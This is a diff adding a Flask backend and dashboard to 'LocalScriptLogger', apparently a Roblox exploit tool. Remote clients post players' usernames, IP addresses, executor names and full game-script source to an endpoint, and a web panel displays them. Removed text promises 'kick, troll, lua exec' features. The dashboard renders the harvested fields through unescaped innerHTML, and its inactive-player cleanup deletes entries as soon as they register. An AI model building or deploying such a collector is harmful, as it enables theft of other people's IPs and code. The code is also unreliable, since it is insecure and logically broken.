@@ -1,37 +1,111 @@
-from flask import Flask, render_template_string
+from flask import Flask, render_template_string, request, jsonify
 import os
 
 app = Flask(__name__)
+
+players = {}  # { userid: { info + scripts } }
 
 HTML = """
 <!DOCTYPE html>
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>LocalScriptLogger - ONLINE</title>
+    <title>LocalScriptLogger - Scripts Viewer</title>
     <style>
-        body {background: linear-gradient(135deg,#000,#1a0033); color:#00ffaa; font-family:'Courier New',monospace; text-align:center; padding-top:8%;}
-        h1 {font-size:6rem; text-shadow:0 0 50px #00ffaa; animation:glow 2s infinite alternate;}
-        .url {font-size:3rem; background:rgba(0,255,170,0.15); padding:25px 40px; border:3px dashed #00ffaa; border-radius:25px; display:inline-block; margin:40px;}
-        p {font-size:1.8rem; max-width:900px; margin:30px auto;}
-        @keyframes glow {from {text-shadow:0 0 20px #00ffaa;} to {text-shadow:0 0 80px #00ffaa;}}
+        body {background:#000;color:#0f0;font-family:Consolas;margin:0;padding:20px;}
+        h1 {text-align:center;color:#0f0;text-shadow:0 0 20px #0f0;}
+        .player {background:#111;padding:15px;margin:10px 0;border-left:5px solid #0f0;border-radius:8px;cursor:pointer;}
+        .player:hover {background:#1a1a1a;}
+        .scripts {display:none;background:#222;padding:15px;margin-top:10px;border-radius:8px;}
+        .script {background:#333;padding:10px;margin:8px 0;border-radius:5px;cursor:pointer;}
+        .script:hover {background:#444;}
+        pre {background:#000;padding:15px;border-radius:8px;overflow:auto;max-height:600px;}
+        .info {font-size:0.9em;color:#aaa;}
     </style>
 </head>
 <body>
-    <h1>LOCALSCRIPTLOGGER</h1>
-    <div class="url">https://localscriptlogger-production.up.railway.app</div>
-    <p>Serveur 100% opérationnel 24/7</p>
-    <p>Le crash est corrigé, tout fonctionne maintenant</p>
-    <p>Dis-moi <strong style="color:#ff3366;">"go full"</strong> quand tu veux la vraie interface complète (kick, troll, lua exec, etc.)</p>
+    <h1>LOCALSCRIPTLOGGER - ONLINE</h1>
+    <div id="players"></div>
+
+    <script>
+        function toggleScripts(id) {
+            const el = document.getElementById('scripts_'+id);
+            el.style.display = el.style.display === 'block' ? 'none' : 'block';
+        }
+        function showScript(source) {
+            document.getElementById('modalCode').textContent = source;
+            document.getElementById('modal').style.display = 'block';
+        }
+        function update() {
+            fetch("/data").then(r => r.json()).then(data => {
+                const container = document.getElementById("players");
+                container.innerHTML = "";
+                Object.entries(data).forEach(([id, p]) => {
+                    const div = document.createElement("div");
+                    div.className = "player";
+                    div.onclick = () => toggleScripts(id);
+                    div.innerHTML = `<strong>${p.username}</strong> (${p.executor})<br>
+                                     <span class="info">IP: ${p.ip} | Jeu: ${p.game}</span>`;
+                    container.appendChild(div);
+
+                    const scriptsDiv = document.createElement("div");
+                    scriptsDiv.id = "scripts_"+id;
+                    scriptsDiv.className = "scripts";
+                    p.scripts.forEach(s => {
+                        const scriptEl = document.createElement("div");
+                        scriptEl.className = "script";
+                        scriptEl.innerHTML = `<strong>${s.name}</strong> (${s.class}) - Parent: ${s.parent}`;
+                        scriptEl.onclick = (e) => { e.stopPropagation(); showScript(s.source); };
+                        scriptsDiv.appendChild(scriptEl);
+                    });
+                    container.appendChild(scriptsDiv);
+                });
+            });
+        }
+        setInterval(update, 5000);
+        update();
+    </script>
+
+    <div id="modal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:999;padding:20px;overflow:auto;">
+        <button onclick="document.getElementById('modal').style.display='none'" style="position:fixed;top:10px;right:20px;padding:10px 20px;background:#f00;color:#fff;border:none;cursor:pointer;">FERMER</button>
+        <pre id="modalCode"></pre>
+    </div>
 </body>
 </html>
 """
 
 @app.route("/")
-def home():
+def index():
     return render_template_string(HTML)
 
-# Ligne magique qui fait TOUT fonctionner sur Railway
+@app.route("/api", methods=["POST"])
+def api():
+    data = request.get_json() or {}
+    uid = str(data.get("userid", ""))
+    if not uid: return jsonify({"ok": False})
+
+    if data.get("action") == "register":
+        players[uid] = {
+            "username": data.get("username", "Unknown"),
+            "executor": data.get("executor", "Unknown"),
+            "ip": data.get("ip", "Unknown"),
+            "game": data.get("game", "Unknown"),
+            "scripts": data.get("scripts", [])
+        }
+    elif data.get("action") == "heartbeat":
+        if uid in players:
+            players[uid]["last_seen"] = "__now__"
+
+    # Nettoyage des joueurs inactifs (> 2 min)
+    to_remove = [k for k, v in players.items() if "__now__" not in v.get("last_seen", "")]
+    for k in to_remove: players.pop(k, None)
+
+    return jsonify({"ok": True})
+
+@app.route("/data")
+def get_data():
+    return jsonify(players)
+
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port)
